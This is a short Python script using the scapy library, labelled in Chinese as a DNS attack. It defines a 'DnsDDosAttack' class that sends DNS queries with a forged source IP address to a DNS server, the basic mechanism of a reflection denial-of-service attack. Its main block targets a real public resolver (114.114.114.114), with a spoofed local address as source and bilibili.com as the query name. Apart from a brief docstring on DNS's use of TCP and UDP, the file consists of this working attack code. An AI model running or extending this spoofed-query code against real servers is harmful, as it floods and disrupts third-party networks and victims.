#!/usr/bin/python
# coding:utf-8

'''
DNS在区域传送（辅域名服务器向上层域名服务器查询数据变动）时使用TCP，因为此时数据包大小常超过512字节。
在域名解析时使用UDP协议，因为负载较低，响应更快。
@date: 2020-06-09
@author: dxbaicai
@desc: DNS攻击
'''

from scapy.all import *
from scapy.layers.dns import DNSQR, DNS
from scapy.layers.inet import IP, UDP


class DnsDDosAttack(object):
    def ddos(self, client, server, dns_name):
        ip = IP(src=client, dst=server)
        send(ip / UDP() / DNS(opcode=0, rd=1, ad=1, qd=DNSQR(qname=dns_name)))


if __name__ == '__main__':
    dnsAttack = DnsDDosAttack()
    dnsAttack.ddos("192.168.31.98", "114.114.114.114", "www.bilibili.com")
